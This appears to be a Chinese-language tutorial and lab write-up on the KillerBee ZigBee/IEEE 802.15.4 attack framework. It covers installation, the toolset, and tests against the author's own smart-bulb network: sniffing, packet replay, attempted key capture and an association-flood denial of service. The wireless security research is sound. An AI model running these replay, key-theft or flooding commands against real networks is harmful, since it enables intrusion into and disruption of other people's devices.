# KillerBee 攻击框架

KillerBee攻击框架，[KillerBee](https://github.com/riverloopsec/killerbee)是针对ZigBee和IEEE 802.15.4网络的框架和安全研究工具。

### 框架要求

KillerBee目前仅支持Linux系统。在安装之前必须安装以下Python模块。在Ubuntu系统上，可以使用以下命令安装所需的依赖项：

```
# apt-get install python-gtk2 python-cairo python-usb python-crypto python-serial python-dev libgcrypt-dev
# git clone https://github.com/secdev/scapy
# cd scapy
# python setup.py install
```

**注：**KillerBee是一个强大但并不“友好”的测试平台，它主要是为开发人员和高级分析专家服务的，所以在此之前建议大家先了解一下[ZigBee协议](http://bit.ly/2I5ppI)。

### 安装KillerBee

KillerBee使用标准的Python “setup.py” 安装文件。使用以下命令安装KillerBee：

```
# python setup.py install
```

### 目录结构

KillerBee代码的目录结构描述如下：

- doc - KillerBee库中的HTML文档，由epydoc提供。
- firmware  - 支持的KillerBee硬件设备的固件。
- killerbee - Python库源代码。
- sample - 样本数据包捕获，在下面引用。
- scripts - 开发中使用的Shell脚本。
- tools - 使用此框架开发的ZigBee和IEEE 802.15.4攻击工具。

### 硬件要求

KillerBee框架目前支持多款设备，包括River Loop ApiMote、Atmel RZ RAVEN无线电收发器、MoteIVTmote Sky、TelosB mote、Sewino嗅探器和运行Silicon Labs Node Test固件的各种硬件。

### 工具介绍

KillerBee包括多种工具，用于攻击使用KillerBee框架构建的ZigBee和IEEE 802.15.4网络。通过“ -h”参数可以查看详细的使用说明，在下面进行了概述。

- zbid - 标识KillerBee和关联工具可以使用的可用接口。
- zbwireshark - 与zbdump相似，但是公开了一个命名管道，以便在Wireshark中进行实时捕获和查看。
- zbdump - 类似tcpdump的功能，用于捕获ibpcap数据包文件。它可以以pcap和Daintree格式保存数据包。
- zbreplay - 实施重放攻击，从指定的Daintree DCF或libpcap数据包捕获文件中读取数据，然后重新传输帧。ACK帧不会重新发送。
- zbstumbler - 激活ZigBee和IEEE 802.15.4网络发现工具。Zbstumbler发送信标请求帧，同时跳频，记录和显示有关已发现设备的摘要信息。
- zbdsniff - 捕获ZigBee流量，查找NWK帧和无线密钥配置。找到密钥后，zbdsniff会将密钥打印到stdout。
- zbkey - 尝试向协调器发送连接请求获取密钥。
- zbconvert - 将数据包捕获从Libpcap转换为Daintree SNA格式，反之亦然。
- zbfind - 一个GTK GUI应用程序，用于通过测量RSSI来跟踪IEEE 802.15.4发射机的位置。
- bscapy - 提供一个交互式的Scapy shell，用于通过KillerBee界面进行交互。必须安装Scapy才能运行此功能。

### 框架介绍

KillerBee主要用于针对数据包捕获文件（libpcap或Daintree SNA）中嗅探数据包的过程，并用于注入任意数据包。包括IEEE 802.15.4，ZigBee NWK和ZigBee APS数据包解码器在内的辅助功能也可用。

KillerBee API以epydoc格式记录，此发行版的doc/目录中包含HTML文档。如果已安装epydoc，则还可以根据需要生成一个方便的PDF进行打印，如下所示：

```
$ cd killerbee
$ mkdir pdf
$ epydoc --pdf -o pdf killerbee/
```

pdf/ 目录将包含一个名为“api.pdf”的文件，其中包括框架文档。

由于KillerBee是一个Python库，因此它集成了其他Python软件。例如，Sulley库是由Pedram Amini用Python编写的模糊测试框架。KillerBee框架使用它来数据包注入功能，用于生成格式不正确的ZigBee数据并将其传输到目标。

## ZigBee流量分析

### ZigBee网络环境

搭建ZigBee协议通信的智能灯泡系统，一共四个终端设备（RGB灯，分为1、2、3、4号）以及ZigBee协调器用于与每个终端设备（灯）网络通信。

<img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210203125506748.png" alt="终端设备（灯）" style="zoom: 80%;" />

### 使用ApiMote

在树莓派环境下，根据前面的介绍安装好KillerBee框架以后，下面开始用手上的ApiMote硬件设备进行ZigBee流量的分析测试。

<img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210202161513999.png" alt="image-20210202161513999" style="zoom: 80%;" />

ApiMote连接树莓派以后，会自动检测到ApiMote（ID 0403:6015）并加载驱动程序。

```
root@raspberrypi:/home/pi/Desktop# lsusb
Bus 001 Device 005: ID 0403:6015 Future Technology Devices International, Ltd Bridge(I2C/SPI/UART/FIFO)
Bus 001 Device 003: ID 0424:ec00 Standard Microsystems Corp. SMSC9512/9514 Fast Ethernet Adapter
Bus 001 Device 002: ID 0424:9514 Standard Microsystems Corp. SMC9514 Hub
Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
```

ApiMote通常会预装好固件，不需要重新刷写。若需要刷写固件，步骤如下：

1. 在 firware/ 目录下包含多种设备的固件，选择ApiMote的固件apimotev4_202011.hex

2. 运行`flash_apimote.sh`脚本，如果第一次不同步而超时，有时可能需要两次尝试才能正确闪烁。

3. 可以通过运行 `sudo zbid`来验证固件，并列出设备。

   ```
   root@raspberrypi:/home/pi/Desktop# zbid
              Dev Product String       Serial Number
     /dev/ttyUSB1 GoodFET Api-Mote v2 
   ```

### 嗅探数据包

**zbwireshark**允许用户在Wireshark中实时嗅探和查看ZigBee流量。该工具创建一个管道，Wireshark然后从中读取数据，并实时显示出来。

```
root@raspberrypi:/home/pi/Desktop# zbwireshark -f 15
zbwireshark: listening on '/dev/ttyUSB1', channel 15, page 0 (2425.0 MHz), link-type DLT_IEEE802_15_4, capture size 127 bytes
```

-f 参数指定第 15 信道。

![image-20210202210009270](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210202210009270.png)



也可以使用 **zbdump** 以pcap和DainTree格式嗅探并保存数据包。这里我们以pcap格式，以便使用wireshark打开分析协议，下面运行zbdump，同样使用 -f 指定信道。

```
root@raspberrypi:/home/pi/Desktop# zbdump -f 15 -w test.pcap 
zbdump: listening on '/dev/ttyUSB1', channel 15, page 0 (2425.0 MHz), link-type DLT_IEEE802_15_4, capture size 127 bytes
^C
54 packets captured
```

使用wireshark打开捕获的数据包

![image-20210202212931882](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210202212931882.png)

数据包中，捕获的源和目的地址被分配了网络ID，例如

* PAN ID ：0xd85b

* 0x0000 通常是协调器。
* 0x0c08 是其中一个终端设备加入ZigBee网络分配的ID。
* 扩展地址是硬件地址：00:12:4b:00:22:30:5e:4b

### 重放ZigBee流量

通过捕获设备的数据包，然后将该流量进行重播回设备。

**zbdump**刚刚使用过此工具将流量保存到数据包文件中，接下来使用**zbreply**工具，将从zbdump获取的pcap文件，通过ApiMote对其重播。

-f 参数指定信道，-w 参数指定用于写入捕获的数据包的pcap文件，-r指定用于读取捕获的数据包的pcap文件。

```
root@raspberrypi:/home/pi/Desktop# zbdump -f 15 -w operating.pcap
zbdump: listening on '/dev/ttyUSB0', channel 15, page 0 (2425.0 MHz), link-type DLT_IEEE802_15_4, capture size 127 bytes
^C
61 packets captured
root@raspberrypi:/home/pi/Desktop# zbreplay -f 15 -r operating.pcap
zbreplay: retransmitting frames from 'operating.pcap' on interface '/dev/ttyUSB0' with a delay of 1.0 seconds.
34 packets transmitted
```

### 嗅探密钥

**zbdsniff** 工具可以从ZigBee网络抓取的流量数据包pcap文件中发现明文的密钥key，并返回key。

```
root@raspberrypi:/home/pi/Desktop# zbdsniff -f operating.pcap -k c028128de295be0708aebe9eed
Processing operating.pcap
[+] Processed 1 capture files.
```

但是我没有从文件中得到任何输出，可能没有找到可用的key。

**zbkey** 与 zbdsniff 目的相似，不同的是 zbkey 会向协调器发送连接，然后发送数据请求来检索获取密钥，而不是扫描pcap文件。-f 参数指定信道，-s 定时，-p 参数指定 PAN ID，-a 参数指定ZigBee硬件地址。但是没有返回成功。

```
root@raspberrypi:/home/pi/Desktop# zbkey -f 15 -s 0.1 -p d85b -a 00124b0022305e4b 
Sending association packet...
Sending data request packet...
Received frame                                          .^
Length of packet received in associate_handle: 54
0000:  61 88 ac 5b d8 c4 10 00 00 08 02 c4 10 00 00 1e   a..[............
0010:  81 28 49 b4 09 00 3a a9 da fe ff 27 71 84 00 ce   .(I...:....'q...
0020:  8c 9f 39 98 2e 26 f8 2c d1 54 ca 0a d9 2d fb 6c   ..9..&.,.T...-.l
0030:  06 82 e3 29 03 00                                 ...)..

Received frame
Length of packet received in associate_handle: 50
0000:  61 88 cd 5b d8 08 0c a2 c4 08 02 08 0c 00 00 1d   a..[............
0010:  85 28 47 99 02 00 4b 5e 30 22 00 4b 12 00 00 b5   .(G...K^0".K....
0020:  a9 58 f8 e2 96 ed ab 4f 9b 50 76 b4 99 d2 99 1a   .X.....O.Pv.....
0030:  09 d1                                             ..

Received frame
Length of packet received in associate_handle: 5
0000:  02 00 af 45 e8                                    ...E.

Sorry, we didn't hear a device respond with an association response. Do you have an active target within range?
```

### 拒绝服务攻击

KillerBee 框架提供了 **zbassocflood**工具，该工具尝试将大量关联请求发送到目标网络。需要PAN ID（-p），信道（-c）和定时（-s）。

```
root@raspberrypi:/home/pi/Desktop# zbassocflood -p d85b -c 15 -s 0.1
zbassocflood: Transmitting and receiving on interface '/dev/ttyUSB0'
.............
^C
Sent 13 associate requests.
```

KillerBee的攻击方式大致分为，发现设备（zbstumbler、zbopenear、zbfind），嗅探流量（zbdump、zbwireshark），获取密钥（zbdsniff、zbkey、zbgoodfind），重放流量（zbscapy、zbreplay），拒绝服务（zbscapy、zbassocflood）。